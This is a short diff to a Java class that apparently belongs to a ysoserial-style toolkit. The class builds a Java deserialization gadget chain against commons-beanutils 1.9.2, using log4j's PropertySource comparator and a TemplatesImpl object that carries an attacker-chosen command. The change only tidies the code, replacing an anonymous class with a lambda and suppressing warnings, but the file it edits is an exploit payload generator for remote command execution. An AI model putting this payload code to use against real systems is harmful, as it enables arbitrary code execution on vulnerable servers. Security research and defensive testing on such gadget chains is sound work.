@@ -9,7 +9,7 @@ import org.apache.logging.log4j.util.PropertySource;
 
 import java.util.PriorityQueue;
 
-
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 @Authors({"SummerSec"})
 public class cb_PropertySource192 implements ObjectPayload<Object> {
@@ -17,12 +17,7 @@ public class cb_PropertySource192 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
-        PropertySource propertySource1 = new PropertySource() {
-            @Override
-            public int getPriority() {
-                return 0;
-            }
-        };
+        PropertySource propertySource1 = () -> 0;
 
         BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
 
